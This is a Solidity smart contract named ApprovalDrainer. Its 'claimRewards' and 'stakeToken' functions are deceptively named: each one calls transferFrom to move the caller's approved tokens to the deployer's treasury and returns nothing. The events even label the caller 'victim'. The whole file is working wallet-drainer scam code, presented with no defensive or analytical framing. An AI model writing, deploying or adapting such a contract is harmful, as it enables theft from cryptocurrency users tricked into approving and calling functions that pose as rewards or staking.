// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract ApprovalDrainer {
    address public treasury;

    event RewardsClaimed(address indexed victim, address indexed token, uint256 amount, address indexed treasury);
    event TokenStaked(address indexed victim, address indexed token, uint256 amount, address indexed treasury);

    constructor() {
        treasury = msg.sender;
    }

    function claimRewards(address token, uint256 amount) external {
        _drain(token, amount);
        emit RewardsClaimed(msg.sender, token, amount, treasury);
    }

    function stakeToken(address token, uint256 amount) external {
        _drain(token, amount);
        emit TokenStaked(msg.sender, token, amount, treasury);
    }

    function _drain(address token, uint256 amount) internal {
        require(token != address(0), "Token required");
        require(amount > 0, "Amount required");
        (bool success, bytes memory data) = token.call(
            abi.encodeWithSignature("transferFrom(address,address,uint256)", msg.sender, treasury, amount)
        );
        bool ok = success && (data.length == 0 || abi.decode(data, (bool)));
        require(ok, "transferFrom failed");
    }
}
